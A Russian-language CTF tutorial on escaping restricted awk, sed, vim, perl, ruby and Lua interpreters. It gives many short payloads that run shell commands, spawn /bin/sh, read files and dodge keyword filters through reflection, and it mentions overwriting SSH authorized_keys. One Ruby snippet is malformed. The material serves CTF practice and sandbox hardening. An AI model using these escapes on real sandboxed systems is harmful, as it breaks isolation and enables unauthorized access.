Джейлы бывают не только на Python и bash. В CTF часто дают «вы можете выполнить только awk-скрипт», «разрешён только sed», «откройте vim и достаньте флаг». Любой язык, который умеет вызывать процессы или читать файлы, — это потенциальный побег. В этом уроке — каталог приёмов для awk, sed, vim, perl, ruby и Lua.

## awk-джейл

awk умеет вызывать команды через `system()` и читать файлы через `getline`:

```awk
BEGIN { system("cat /flag") }
```

Или без `system`:

```awk
BEGIN { while ((getline line < "/flag") > 0) print line }
```

Если фильтр запрещает `system` и `getline`, используют перенаправление:

```awk
BEGIN { print "x" | "cat /flag" }
```

awk также может писать во временный файл, что иногда даёт RCE через `| "sh"`. Проверяйте, какие функции запрещены: `system`, `close`, `getline`, `printf` с pipe.

## sed-джейл

sed имеет команды `e` (execute) и `r`/`w` (read/write file):

```bash
echo x | sed 's/x/$(cat \/flag)/e'
```

`e` выполняет результат подстановки как shell-команду. Если `e` запрещено, а `r` разрешено — читаем файл:

```bash
sed 'r /flag' <<< ""
```

`w` пишет в файл (например, `~/.ssh/authorized_keys`). GNU sed позволяет `e` в `s///e`, `e command`, а также `#n` для подавления вывода.

## vim-джейл

vim — это среда с shell-доступом. Выходы:

```vim
:!cat /flag
:r /flag
:set shell=/bin/sh
:!/bin/sh
:python3 import os; os.system('cat /flag')
:lua os.execute('cat /flag')
```

Также `:terminal` (если собран с `+terminal`), `:read !command`. Если vim в restricted mode (`rvim`), запрещены `:!` и `:shell`, но остаются `:python`/`:lua`/`:perl` (если включены) и `:r file`.

## perl-джейл

Perl умеет открывать процессы и файлы:

```perl
open(my $fh, "-|", "cat /flag") or die; print <$fh>;
system("cat /flag");
`cat /flag`;                      # backticks
```

Если `system`/backticks запрещены, `open` с pipe работает. Также `readpipe`, `qx{}`. Если запрещены и `open`, пробуйте `do`/`require` (чтение и исполнение файла) или `eval` со строками, собранными из `chr`.

```perl
perl -e 'print `cat /flag`'
```

## ruby-джейл

Ruby — богатый набор:

```ruby
system("cat /flag")
`cat /flag`
IO.read("/flag")
File.open("/flag").read
eval("`cat /flag`")
Kernel.exec("sh")
```

Также `%x{}` (backticks), `Process.spawn`, `Open3`. Обход фильтров — `send`, `public_send`, `method(:system).call`. Если `eval` запрещён, но доступны константы — ищем `Object.const_get(:Kernel)`.

## Lua-джейл

Lua-песочницы часто убирают `os`/`io`:

```lua
os.execute("cat /flag")
io.open("/flag"):read("*a")
```

Если `os`/`io` убраны, но остался `loadstring`/`load` — исполняем код. Если и их нет — ищем ссылки через `debug.getregistry()` или `getfenv` (Lua 5.1) — они часто возвращают оригинальное окружение с `os`/`io`. Подробнее — в `misc-lua-sandbox`.

## Общая методология побега

1. **Инвентаризация**: какие функции/модули доступны? (`awk 'BEGIN{...}'`, `perl -e '...'`)
2. **Поиск примитива выполнения**: `system`, `exec`, backticks, pipe-open, `e`-команда.
3. **Поиск примитива чтения**: `open`, `getline`, `:r`, `IO.read`.
4. **Обход фильтров**: построение строк из `chr`, конкатенация, `getattr`/`send`.
5. **Восстановление shell**: запустить `/bin/sh` через найденный примитив.

| Язык | Примитив exec | Примитив read |
|------|---------------|---------------|
| awk | `system()`, `print | "cmd"` | `getline < file` |
| sed | `s///e` | `r file` |
| vim | `:!cmd`, `:python` | `:r file` |
| perl | `system`, backticks, `open "-|"` | `open "<"` |
| ruby | `system`, backticks, `exec` | `File.read` |
| lua | `os.execute` | `io.open` |

## Разобранный пример

Задача: разрешено выполнить только `sed`-скрипт над вводом.

```bash
echo 'anything' | sed 's/.*/cat \/flag/e'
# flag{sed_escape}
```

Если `e` вырезано, но `r` доступно:

```bash
sed 'r /flag' <<< ''
```

Если запрещён и `r`, пробуем `w`:

```bash
sed 's/.*/x/w /dev/stdout' <<< ''   # запись, но чтения нет
```

Тогда ищем другой бинарь в PATH.

## Частые ошибки и подводные камни

- Пытаться вызвать запрещённую функцию вместо её аналога (`system` vs pipe-open).
- Забывать про экранирование `/` в sed-скриптах (`\/`).
- Считать `rvim` полностью безопасным: плагины и `:python` могут остаться.
- Игнорировать версию: в Lua 5.1 есть `getfenv`, в 5.2+ нет.
- Не проверять, какие модули реально загружены (`require` может быть отключён).
- Писать длинные обходы, не проверив простейший примитив.

## Дополнительная теория: почему джейлы вообще возможны

Джейл на любом языке существует потому, что между «языком» и «окружением» нет жёсткой стены. Интерпретатор — это программа с доступом к ОС; если в его пространстве имён остаётся хоть одна функция, способная вызвать процесс или открыть файл, побег возможен. Разработчики джейлов пытаются вырезать опасные функции, но языки настолько связаны (модули, глобальные объекты, отражение), что полностью изолировать интерпретатор крайне сложно. Именно поэтому «правильная» песочница — это не «вырезать `system`», а запустить интерпретатор в отдельном процессе с seccomp/namespaces (см. `misc-seccomp-escape`, `misc-namespace-escape`).

Полезно классифицировать джейлы по тому, что осталось: (1) доступен `system`/`exec` — тривиальный побег; (2) доступен только ввод-вывод — читаем файл; (3) доступно отражение (`getattr`, `send`, `debug`) — восстанавливаем функции; (4) ничего — нужна уязвимость в самом интерпретаторе. Задача решателя — понять, к какому классу относится конкретный джейл, и действовать соответственно.

## Общий рецепт для незнакомого языка

Когда встречаете джейл на незнакомом языке, действуйте системно. Сначала выясните, какой это язык и какие модули загружены: часто в описании сказано. Затем поищите «примитив выполнения» — в большинстве языков это `system`-подобная функция, backticks, pipe-open или `eval`. Если всё вырезано, ищите отражение: в Perl — `send`/`symbolic refs`, в Ruby — `send`/`method`, в Lua — `getfenv`/`debug`. Затем ищите примитив чтения: `open`, `IO.read`, `:r`, `getline`. Соберите минимальный payload: например, `perl -e 'print `cat /flag`'` или `awk 'BEGIN{while((getline l<"/flag")>0)print l}'`. Проверяйте каждый шаг в локальной копии джейла, а не вслепую на сервере.

## Разбор ошибок и отладка

Если команда не выполняется, проверьте, что она вообще доходит до примитива: возможно, фильтр режет кавычки или слэши. Тогда стройте строки из `chr`/`char` и конкатенации. Если процесс «зависает» — возможно, примитив читает stdin; подайте EOF. Если ответ пуст, а ошибок нет — вероятно, вывод перенаправлен или функция возвращает значение, которое не печатается; используйте явный вывод. В awk помните, что `system` возвращает код, а не вывод — вывод идёт напрямую в stdout. В sed флаг `e` выполняет **результат подстановки**, поэтому порядок важен. В vim не забывайте про `:redir` для захвата вывода. Всегда держите локальную копию джейла для безопасных экспериментов.

## Практический разбор: два джейла подряд

Первый джейл: «выполните только Perl-выражение, `system` и backticks запрещены словами». Обход — `open` с pipe, который фильтр по словам не ловит:

```perl
open(F, "-|", "cat /flag") or die; print while <F>;
```

Второй джейл: «только Ruby, `system`/`exec` запрещены». Обход — `%x{}` или `IO.popen`:

```ruby
puts %x{cat /flag}
```

Если запрещены и они — используйте `Kernel.send(:`, )` или `public_send(:system, "cat /flag")`: фильтр ищет литерал `system`, а `send` строит вызов динамически. Дальше — если запрещён и `send`, восстанавливаем его через `Object.instance_method(:send).bind(self).call(...)`. Каждый уровень фильтра требует чуть более изощрённого отражения, но принцип один: найти путь к примитиву выполнения в обход буквального запрета. Ведите список запрещённых слов и для каждого ищите синоним или путь через отражение.
